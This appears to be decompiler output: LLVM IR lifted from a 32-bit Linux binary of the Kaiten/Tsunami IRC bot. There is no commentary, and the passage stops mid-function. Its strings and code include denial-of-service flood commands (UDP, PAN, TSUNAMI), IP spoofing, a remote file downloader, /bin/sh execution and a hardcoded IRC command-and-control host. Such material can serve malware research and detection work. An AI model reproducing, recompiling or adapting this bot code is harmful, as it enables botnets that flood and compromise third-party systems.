source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8055a14.2 = global i32 0
@global_var_8055a44.3 = local_unnamed_addr global i32* @global_var_8055a14.2
@global_var_8055de4.4 = global i32 0
@global_var_80585c8.7 = local_unnamed_addr global i32 0
@global_var_8052230.8 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_8055e10.9 = local_unnamed_addr global i32 0
@global_var_80586ec.10 = local_unnamed_addr global i32 0
@global_var_805224e.13 = constant i32 1966014578
@global_var_8052250.14 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8052260.16 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805227c.17 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_80522a0.18 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_80522c5.19 = constant [8 x i8] c"http://\00"
@global_var_80522d0.20 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_80522f8.21 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_8052320.22 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_8052434.23 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8052450.24 = constant [3 x i8] c"wb\00"
@global_var_8052453.25 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8052458.26 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8052470.27 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_8052490.28 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_80524be.29 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_80524db.30 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_80524f4.31 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_8052529.32 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_8052532.33 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_8052574.36 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_8052597.37 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_80525b8.38 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_80584c0.39 = global i32 0
@global_var_80525e0.40 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_80525ff.41 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8052619.42 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8052636.43 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8052651.44 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8052670.45 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8052690.46 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8056220.47 = global i32 0
@global_var_80526dc.48 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_8052700.49 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_8052727.50 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_8052760.51 = constant i32 2
@global_var_80527b0.52 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_80527d7.53 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_80527f0.54 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_8052814.55 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_80586e0.59 = local_unnamed_addr global i32 0
@global_var_8055e00.60 = local_unnamed_addr global i32 0
@global_var_80586e8.79 = local_unnamed_addr global i32 0
@global_var_80585c4.80 = local_unnamed_addr global i32 0
@global_var_8052fcd.90 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_8052fda.92 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_8052fe7.93 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_8052fef.94 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_8052ff8.95 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_8052220.100 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_8055a64.101 = global [16 x i8]* @global_var_8052220.100
@global_var_8058480.106 = global i32 0
@global_var_8055b78.107 = global i32 0
@global_var_8056240.108 = local_unnamed_addr global i32 0
@global_var_8056244.109 = local_unnamed_addr global i32 0
@global_var_8056224.110 = global i32 0
@global_var_805623c.111 = local_unnamed_addr global i32 0
@global_var_80533c0.112 = constant [3 x i8] c"-c\00"
@global_var_80533c8.113 = constant [3 x i8] c"sh\00"
@global_var_80533c3.114 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055b90.115 = local_unnamed_addr global i32 2
@global_var_8055b60.116 = global i32 0
@global_var_8055b5c.117 = global i32* bitcast (i16* @global_var_8055ba0.103 to i32*)
@global_var_80533cc.118 = constant i32 0
@global_var_80533e4.119 = constant [6 x i8] c"(nil)\00"
@global_var_80533ea.120 = constant [7 x i8] c"(null)\00"
@global_var_80533f1.121 = constant i32 2949163
@global_var_805345e.123 = constant i32 327688
@global_var_8055da0 = external local_unnamed_addr global i32
@global_var_80546a0.125 = constant i32 65536
@global_var_8053456.126 = constant [8 x i8] c" +0-#'I\00"
@global_var_8053404.127 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8053441.128 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8053437.129 = constant i32 117506048
@global_var_8053428.130 = constant i32 331776
@global_var_80534a0.131 = constant [8 x i8] c"Success\00"
@global_var_8053482.132 = constant [15 x i8] c"Unknown error \00"
@global_var_8055da8.133 = local_unnamed_addr global i32* @global_var_80546a0.125
@global_var_8058280.134 = global i32 0
@global_var_805844c.135 = global i32 0
@global_var_8055db0.136 = global i32 0
@global_var_8058a94.137 = local_unnamed_addr global i32 0
@global_var_8058a88.138 = global i32 0
@global_var_8055c90.139 = global i32 0
@global_var_805872c.141 = global i32 0
@global_var_8058730.142 = local_unnamed_addr global i32 0
@global_var_8058734.143 = global i32 0
@global_var_8058740.144 = local_unnamed_addr global i32 0
@global_var_8058a34.145 = global i32 0
@global_var_8058a5c.146 = local_unnamed_addr global i32 0
@global_var_8058a4c.147 = local_unnamed_addr global i32 0
@global_var_8058a50.148 = local_unnamed_addr global i32 0
@global_var_8058a54.149 = local_unnamed_addr global i32 0
@global_var_8058a70.150 = local_unnamed_addr global i32 0
@global_var_8058a58.151 = local_unnamed_addr global i32 0
@global_var_8058a64.152 = local_unnamed_addr global i32 0
@global_var_8058a68.153 = local_unnamed_addr global i32 0
@global_var_8058a74.154 = local_unnamed_addr global i32 0
@global_var_8058a48.155 = local_unnamed_addr global i32 0
@global_var_8058a44.157 = local_unnamed_addr global i32 0
@global_var_8058a6c.158 = local_unnamed_addr global i32 0
@global_var_805873c.159 = local_unnamed_addr global i32 0
@global_var_8055ca8.160 = global i32 0
@global_var_8055cc0.162 = global i32 0
@global_var_8055cd8 = external global i32
@global_var_8055d04.164 = global i32 -1726662223
@global_var_8055ce0.165 = local_unnamed_addr global i32* @global_var_8055d04.164
@global_var_8055cdc.166 = global i32* @global_var_8055d04.164
@global_var_8054014.167 = constant i32 0
@global_var_8054000.168 = constant i32 0
@global_var_8055d80.169 = global i32 0
@global_var_8058464.170 = local_unnamed_addr global i32 0
@global_var_805846c.171 = local_unnamed_addr global i32 0
@global_var_8055a08.173 = global i32 -1
@global_var_804efef.174 = constant i32 -294069
@global_var_8058474.175 = local_unnamed_addr global i32 0
@global_var_8058478.176 = local_unnamed_addr global i32 0
@global_var_8054280.177 = constant [10 x i8] c"/dev/null\00"
@global_var_8058470.179 = local_unnamed_addr global i32 0
@global_var_8058468.180 = local_unnamed_addr global i32 0
@global_var_804f1d7.182 = constant i32 1928542531
@global_var_804f1fb.183 = constant i32 1928542531
@global_var_80584a4.184 = local_unnamed_addr global i32 0
@global_var_8058484.185 = global i32 0
@global_var_80548b0.187 = constant [4 x i8] c"inf\00"
@global_var_80548b3.192 = constant i32 1179535616
@global_var_80548c0.193 = constant i32 2883630
@global_var_8058488.194 = global i32 0
@global_var_8058a98.197 = local_unnamed_addr global i32 0
@global_var_805497c.198 = constant i32 1697579054
@global_var_80549b0.199 = constant i32 1868824690
@global_var_805497e.200 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805498f.201 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80549a7.202 = constant [11 x i8] c"nameserver\00"
@global_var_80549b2.203 = constant [7 x i8] c"domain\00"
@global_var_80549b9.204 = constant [7 x i8] c"search\00"
@global_var_8058a78.205 = global i32 0
@global_var_8058a9c.206 = local_unnamed_addr global i32 0
@global_var_8058aa0.207 = local_unnamed_addr global i32 0
@global_var_80549d4.208 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80549d1.210 = constant [3 x i8] c"%x\00"
@global_var_80549e5.211 = constant [11 x i8] c"/etc/hosts\00"
@global_var_80549f0.212 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8055de0.1 = local_unnamed_addr global i8 0
@global_var_8055e20.5 = external global i8*
@global_var_8055e04.6 = local_unnamed_addr global i8 0
@global_var_8055e08.11 = external global i8*
@global_var_8055e0c.12 = local_unnamed_addr global i64 0
@global_var_8055e0b.96 = external local_unnamed_addr global i8*
@global_var_8055e0a.97 = external local_unnamed_addr global i8*
@global_var_8055e09.98 = external global i8*
@global_var_8055a60.99 = local_unnamed_addr global i64 577905648021274628
@global_var_8055ba0.103 = global i16 288
@global_var_8055bf0.104 = local_unnamed_addr global i16 272
@global_var_8053476.122 = external constant i8*
@global_var_8058700.140 = global i8 0
@global_var_8058a60.156 = local_unnamed_addr global i8 0
@global_var_8058460.161 = local_unnamed_addr global i8 0
@global_var_805847c.178 = local_unnamed_addr global i8 0
@global_var_80548e0.190 = constant x86_fp80* null
@global_var_80584a0.195 = local_unnamed_addr global i64 0
@global_var_8055dac.196 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 55679
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_80521d0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8055de0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055a44.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055a44.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055a44.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8055de0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055a44.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055de0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 134564356)
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* inttoptr (i32 134568472 to i32*), align 8
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @function_804f08b(i32 134525091, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134554116, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804818c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804818c:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818f = load i32, i32* @ebx, align 4
  store i32 %v0_804818f, i32* %stack_var_-8, align 4
  %v4_8048193 = ptrtoint i8* %arg1 to i32
  %v2_8048196 = load i8, i8* %arg1, align 1
  %v12_804819f = icmp eq i8 %v2_8048196, 42
  br i1 %v12_804819f, label %dec_label_pc_80481c7, label %dec_label_pc_80481a5

dec_label_pc_80481a5:                             ; preds = %dec_label_pc_804818c
  %v12_80481a5 = icmp eq i8 %v2_8048196, 63
  br i1 %v12_80481a5, label %dec_label_pc_804821a, label %dec_label_pc_80481ab

dec_label_pc_80481ab:                             ; preds = %dec_label_pc_80481a5
  %v4_80481ab = icmp eq i8 %v2_8048196, 0
  br i1 %v4_80481ab, label %dec_label_pc_80481b6, label %dec_label_pc_8048254

dec_label_pc_80481b6:                             ; preds = %dec_label_pc_80481ab
  %v2_80481b9 = load i8, i8* %tmp13, align 1
  %v2_80481bc = sext i8 %v2_80481b9 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c7:                             ; preds = %dec_label_pc_804818c
  %v1_80481ca = add i32 %v4_8048193, 1
  %v4_80481d2 = inttoptr i32 %v1_80481ca to i8*
  %v5_80481d5 = call i32 @function_804818c(i8* %v4_80481d2, i32 %arg2)
  %v1_80481da = icmp eq i32 %v5_80481d5, 0
  br i1 %v1_80481da, label %dec_label_pc_8048208, label %dec_label_pc_80481de

dec_label_pc_80481de:                             ; preds = %dec_label_pc_80481c7
  %v2_80481e1 = load i8, i8* %tmp13, align 1
  %v4_80481e4 = icmp eq i8 %v2_80481e1, 0
  br i1 %v4_80481e4, label %dec_label_pc_804820f, label %dec_label_pc_80481e8

dec_label_pc_80481e8:                             ; preds = %dec_label_pc_80481de
  %v1_80481eb = add i32 %arg2, 1
  %v5_80481f6 = call i32 @function_804818c(i8* nonnull %arg1, i32 %v1_80481eb)
  %v1_80481fb = icmp eq i32 %v5_80481f6, 0
  br i1 %v1_80481fb, label %dec_label_pc_8048208, label %dec_label_pc_804820f

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481e8, %dec_label_pc_80481c7
  br label %dec_label_pc_804820f

dec_label_pc_804820f:                             ; preds = %dec_label_pc_80481de, %dec_label_pc_80481e8, %dec_label_pc_8048208
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048208 ], [ 1, %dec_label_pc_80481e8 ], [ 1, %dec_label_pc_80481de ]
  br label %dec_label_pc_80482aa

dec_label_pc_804821a:                             ; preds = %dec_label_pc_80481a5
  %v2_804821d = load i8, i8* %tmp13, align 1
  %v4_8048220 = icmp eq i8 %v2_804821d, 0
  br i1 %v4_8048220, label %dec_label_pc_804824c, label %dec_label_pc_8048224

dec_label_pc_8048224:                             ; preds = %dec_label_pc_804821a
  %v1_8048227 = add i32 %arg2, 1
  %v1_804822b = add i32 %v4_8048193, 1
  %v4_8048230 = inttoptr i32 %v1_804822b to i8*
  %v5_8048233 = call i32 @function_804818c(i8* %v4_8048230, i32 %v1_8048227)
  %v1_8048238 = icmp ne i32 %v5_8048233, 0
  %. = zext i1 %v1_8048238 to i32
  br label %dec_label_pc_804824c

dec_label_pc_804824c:                             ; preds = %dec_label_pc_8048224, %dec_label_pc_804821a
  %storemerge5 = phi i32 [ 1, %dec_label_pc_804821a ], [ %., %dec_label_pc_8048224 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048254:                             ; preds = %dec_label_pc_80481ab
  %v2_8048257 = load i8, i8* %arg1, align 1
  %v2_804825a = sext i8 %v2_8048257 to i32
  %v2_8048260 = call i32 @function_804b7d4(i32 %v2_804825a)
  store i32 %v2_8048260, i32* @ebx, align 4
  %v2_804826a = load i8, i8* %tmp13, align 1
  %v2_804826d = sext i8 %v2_804826a to i32
  %v2_8048273 = call i32 @function_804b7d4(i32 %v2_804826d)
  %v0_8048278 = load i32, i32* @ebx, align 4
  %v12_8048278 = icmp eq i32 %v0_8048278, %v2_8048273
  %v1_804827a = icmp eq i1 %v12_8048278, false
  br i1 %v1_804827a, label %dec_label_pc_80482a4, label %dec_label_pc_804827c

dec_label_pc_804827c:                             ; preds = %dec_label_pc_8048254
  %v1_804827f = add i32 %arg2, 1
  %v1_8048283 = add i32 %v4_8048193, 1
  %v4_8048288 = inttoptr i32 %v1_8048283 to i8*
  %v5_804828b = call i32 @function_804818c(i8* %v4_8048288, i32 %v1_804827f)
  %v1_8048290 = icmp ne i32 %v5_804828b, 0
  %.7 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827c, %dec_label_pc_8048254
  %storemerge = phi i32 [ 1, %dec_label_pc_8048254 ], [ %.7, %dec_label_pc_804827c ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_804824c, %dec_label_pc_804820f, %dec_label_pc_80481b6, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_804820f ], [ %storemerge5, %dec_label_pc_804824c ], [ %v2_80481bc, %dec_label_pc_80481b6 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v2_80482b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80482b0, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048196, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_804b7d4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804820f, { 2, 1, 0 }
}

define i32 @function_80482b3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80482b3:
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80482b6 = load i32, i32* @edi, align 4
  store i32 %v0_80482b6, i32* %stack_var_-8, align 4
  %v4_80482bd = ptrtoint i32* %stack_var_12 to i32
  %v5_80482d5 = call i32 @function_804b924(i32 ptrtoint (i8** @global_var_8055e20.5 to i32), i32 %arg2, i32 %v4_80482bd)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8055e20.5 to i32), i32* @edi, align 4
  %v3_80482ed = call i32 @_strlen(i8* bitcast (i8** @global_var_8055e20.5 to i8*))
  %v6_8048306 = call i32 @function_804b79c(i32 %arg1, i32* bitcast (i8** @global_var_8055e20.5 to i32*), i32 %v3_80482ed)
  %v2_804830e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804830e, i32* @edi, align 4
  ret i32 %v6_8048306
}

define i32 @function_8048311(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048311:
  %v0_8048317 = load i8, i8* @global_var_8055e04.6, align 4
  %v10_804831e = icmp eq i8 %v0_8048317, 1
  %v1_8048320 = icmp eq i1 %v10_804831e, false
  br i1 %v1_8048320, label %dec_label_pc_804834b, label %dec_label_pc_8048322

dec_label_pc_8048322:                             ; preds = %dec_label_pc_8048311
  %v0_8048322 = load i32, i32* @global_var_80585c8.7, align 8
  %v3_804833a = call i32 @function_80482b3(i32 %v0_8048322, i32 ptrtoint ([30 x i8]* @global_var_8052230.8 to i32))
  br label %dec_label_pc_80483e9

dec_label_pc_804834b:                             ; preds = %dec_label_pc_8048311
  %v0_804834b = call i32 @function_804b624()
  %v4_8048353 = icmp eq i32 %v0_804834b, 0
  %v1_8048357 = icmp eq i1 %v4_8048353, false
  br i1 %v1_8048357, label %dec_label_pc_8048364, label %dec_label_pc_8048359

dec_label_pc_8048359:                             ; preds = %dec_label_pc_804834b
  br label %dec_label_pc_80483e9

dec_label_pc_8048364:                             ; preds = %dec_label_pc_804834b
  %v0_8048364 = load i32, i32* @global_var_8055e10.9, align 16
  %v1_8048369 = add i32 %v0_8048364, 1
  store i32 %v1_8048369, i32* @global_var_8055e10.9, align 16
  %v2_8048374 = mul i32 %v1_8048369, 4
  %v1_8048377 = add i32 %v2_8048374, 4
  %v1_804837d = call i32 @function_804daaa(i32 %v1_8048377)
  %v0_80483b011 = load i32, i32* @global_var_8055e10.9, align 16
  %v6_80483b913 = icmp eq i32 %v0_80483b011, 1
  br i1 %v6_80483b913, label %dec_label_pc_80483bb, label %dec_label_pc_804838e

dec_label_pc_804838e:                             ; preds = %dec_label_pc_8048364, %dec_label_pc_804838e
  %storemerge14 = phi i32 [ %v4_80483ad, %dec_label_pc_804838e ], [ 0, %dec_label_pc_8048364 ]
  %v2_8048391 = mul i32 %storemerge14, 4
  %v5_8048396 = add i32 %v2_8048391, %v1_804837d
  %v0_80483a1 = load i32, i32* @global_var_80586ec.10, align 4
  %v2_80483a6 = add i32 %v0_80483a1, %v2_8048391
  %v1_80483a9 = inttoptr i32 %v2_80483a6 to i32*
  %v2_80483a9 = load i32, i32* %v1_80483a9, align 4
  %v2_80483ab = inttoptr i32 %v5_8048396 to i32*
  store i32 %v2_80483a9, i32* %v2_80483ab, align 4
  %v4_80483ad = add i32 %storemerge14, 1
  %v0_80483b0 = load i32, i32* @global_var_8055e10.9, align 16
  %v1_80483b5 = add i32 %v0_80483b0, -1
  %v6_80483b9 = icmp ugt i32 %v1_80483b5, %v4_80483ad
  br i1 %v6_80483b9, label %dec_label_pc_804838e, label %dec_label_pc_80483bb

dec_label_pc_80483bb:                             ; preds = %dec_label_pc_804838e, %dec_label_pc_8048364
  %v0_80483b0.lcssa = phi i32 [ %v0_80483b011, %dec_label_pc_8048364 ], [ %v0_80483b0, %dec_label_pc_804838e ]
  %v2_80483c0 = mul i32 %v0_80483b0.lcssa, 4
  %v5_80483c3 = add i32 %v2_80483c0, %v1_804837d
  %v1_80483c6 = add i32 %v5_80483c3, -4
  %v2_80483cc = inttoptr i32 %v1_80483c6 to i32*
  store i32 %v0_804834b, i32* %v2_80483cc, align 4
  %v0_80483ce = load i32, i32* @global_var_80586ec.10, align 4
  %v1_80483d6 = call i32 @function_804e481(i32 %v0_80483ce)
  store i32 %v1_804837d, i32* @global_var_80586ec.10, align 4
  br label %dec_label_pc_80483e9

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_8048359, %dec_label_pc_8048322, %dec_label_pc_80483bb
  %stack_var_-24.0 = phi i32 [ %v0_804834b, %dec_label_pc_80483bb ], [ %v0_804834b, %dec_label_pc_8048359 ], [ 1, %dec_label_pc_8048322 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483ad, { 1, 0 }
  uselistorder i32 %v2_8048391, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v0_80483b011, { 1, 0 }
  uselistorder i32 %v1_804837d, { 2, 0, 1 }
  uselistorder i32* @global_var_8055e10.9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80483e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804838e, { 1, 0 }
}

define i32 @function_80483ee() local_unnamed_addr {
dec_label_pc_80483ee:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v0_80483ee = load i32, i32* @ebp, align 4
  %v0_80483f4 = load i8*, i8** @global_var_8055e08.11, align 4
  %v1_80483f4 = ptrtoint i8* %v0_80483f4 to i32
  store i32 %v1_80483f4, i32* @eax, align 4
  %v2_80483f9 = icmp eq i8* %v0_80483f4, null
  %v1_80483fb = icmp eq i1 %v2_80483f9, false
  br i1 %v1_80483fb, label %dec_label_pc_8048407, label %dec_label_pc_80483fd

dec_label_pc_80483fd:                             ; preds = %dec_label_pc_80483ee
  %v1_80483fd = call i32 @function_804e754(i32 %v0_80483ee)
  br label %dec_label_pc_8048450

dec_label_pc_8048407:                             ; preds = %dec_label_pc_80483ee
  %v0_8048407 = load i64, i64* @global_var_8055e0c.12, align 8
  %v1_8048407 = trunc i64 %v0_8048407 to i32
  store i32 %v1_8048407, i32* @eax, align 4
  %v9_804840c = icmp eq i32 %v1_8048407, 1
  %v1_804840f = icmp eq i1 %v9_804840c, false
  br i1 %v1_804840f, label %dec_label_pc_8048423, label %dec_label_pc_8048411

